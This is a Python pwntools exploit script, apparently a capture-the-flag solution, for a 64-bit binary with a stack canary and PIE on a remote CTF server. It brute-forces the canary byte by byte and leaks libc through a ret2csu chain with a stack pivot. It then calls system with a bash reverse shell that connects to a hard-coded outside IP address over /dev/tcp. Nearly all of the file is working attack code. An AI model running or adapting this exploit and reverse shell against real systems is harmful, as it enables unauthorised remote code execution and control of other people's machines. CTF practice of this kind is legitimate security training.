#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./level3.1-coopie_x64"
elf=ELF(pwn_file)
libc=ELF("./libc-2.23.so")
#heap_add=0
#stack_add=0

if len(sys.argv)==1:
    #r=process(pwn_file)
    r = remote("127.0.0.1", 0x2AFB)
    #pid=r.pid
else:
    r=remote("pwn.sixstars.team", 23003)
    pid=0

def debug():
    #log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.add)
    pause()

# 探测canary 和 pie的函数
def bypass_canary(host, port, offset):
    canary = 0
    for i in range(8):
      canary_byte = 10 # the \n
      for j in range(0x100):
        if j==10:
            continue
        try:
           conn = remote(host, port)
           conn.recvline()
           payload = offset + p64(canary)[:i] + chr(j)
           conn.sendline(payload)
           conn.recvline()
        except:
           print "smash!" 
           conn.close()
        else:
           print "got one!"
           canary_byte = j
           print canary_byte
           conn.close()
           break
      canary = canary + canary_byte * (0x100**i)
    return canary
# 调用函数检测canary 和 Pie
canary = 0x4cfc727942c54b00 #bypass_canary("pwn.sixstars.team", 23003, 'a'*0x48)#0xc9889049c4232b00#bypass_canary("127.0.0.1",  0x2AFB , 'a'*0x48)
#ret_pos = bypass_canary("pwn.sixstars.team", 23003, 'a'*0x48 + p64(canary) +'a'*8 )
text_start =0x556074461ffb #ret_pos - 0x14ee #0x5595200bfffb
print "where is the rough .text_pos"
print hex(text_start)

print "what the canary is:"
print hex(canary)
# get the precise position of .text
if text_start % 0x1000 > 0x800:
    text_start = ((text_start >>12) +1) << 12 
else:
    text_start = (text_start >> 12) << 12
print "the start of .text:"
print hex(text_start)


def getcsu(pre_addr, loop_addr, rbx,rbp, func_addr,rdx,rsi, rdi):
    csu = p64(pre_addr) + p64(rbx) + p64(rbp) + p64(func_addr) + p64(rdx) + p64(rsi) + p64(rdi) + p64(loop_addr)
    return csu

# info about return to csu
loop_addr = 0x1580 + text_start
pre_addr  = 0x159a + text_start
send_addr = 0x1247  + text_start
rbx = 0
rbp = 1
recv_got = text_start + 0x202018

# info to trans the stack
bss_start = text_start + 0x202000
bug_func_jump = text_start + 0xF34
leave_ret  = text_start + 0xF8C

rbp_pos1 = bss_start + 0x600 
rbp_pos2 = rbp_pos1  - 0x50

pay_basic = 'a'*0x48 + p64(canary) 


csu = getcsu(pre_addr,loop_addr,0,1,rbp_pos2 , 8, recv_got, 4)
print len(csu)
print csu
'''
换栈:
1. 第一次溢出，改变rbp (程序根据rbp位置输入)
2. 第二次，跳leave_ret, 利用连续两次leave_ret,改变rsp
3. 第二次传给rsp的值正好是第一次改的位置，正好ret第二次输入地址 即csu
4. send_addr位置保存的是send函数的地址（这里应该用got表的，逻辑会更清晰）
'''

payload_1 = pay_basic + p64(rbp_pos1) + p64(bug_func_jump)
payload_2 = p64(send_addr) + csu + 'a'*(0x48-len(csu)-8)+ p64(canary) + p64(rbp_pos2) + p64(leave_ret)


r.recvuntil("Would you like 64-bit cookie PIE?\n")
r.sendline(payload_1)
r.recvuntil("Would you like 64-bit cookie PIE?\n")
r.sendline(payload_2)
w = r.recv()

r.close()

recv_addr = u64(w)
libc.address = recv_addr - libc.sym["recv"]
print hex(libc.address)

#libc.address = 0x7f637ff8d000 # 0x7fc2231b0000

r = remote("pwn.sixstars.team", 23003)
rebound_shell = 'bash -c \"/bin/bash -i > /dev/tcp/118.89.101.128/1234 0<&1 2<&1\"\x00'
#rebound_shell = '/bin/bash -i > /dev/tcp/118.89.101.128/1234 0<&1 2<&1\x00'
system_addr = libc.sym['system']
print hex(system_addr)
r_s_addr = bss_start + 0x7b0
csu = getcsu(pre_addr,loop_addr,0,1,rbp_pos2, 0, 0, r_s_addr)
print csu
rbp_pos3  = bss_start + 0x800
rbp_pos4  = rbp_pos1 - 0x80 - 0x68 
payload_1 = pay_basic +  p64(rbp_pos3) + p64(bug_func_jump)
payload_2 = rebound_shell + 'a'*(0x48-len(rebound_shell)) +  p64(canary)  + p64(rbp_pos4) + p64(bug_func_jump)
jump_addr = libc.address + 0x279cb
print hex(jump_addr)
payload_3  = pay_basic + p64(rbp_pos1) + p64(bug_func_jump) +  p64(jump_addr) + p64(r_s_addr) + 'a'*0x10
payload_4 =  p64(0)*5 +p64(system_addr)+'a'*0x18 + p64(canary) + p64(rbp_pos2-0x28- 0x68)+p64(leave_ret) 


r.recvuntil("cookie PIE?\n")
r.sendline(payload_1)
r.recvuntil("cookie PIE?\n")
r.sendline(payload_2)
r.recvuntil("cookie PIE?\n")
debug()
r.send(payload_3)
r.recvuntil("cookie PIE?\n")
r.sendline(payload_4)

r.interactive()
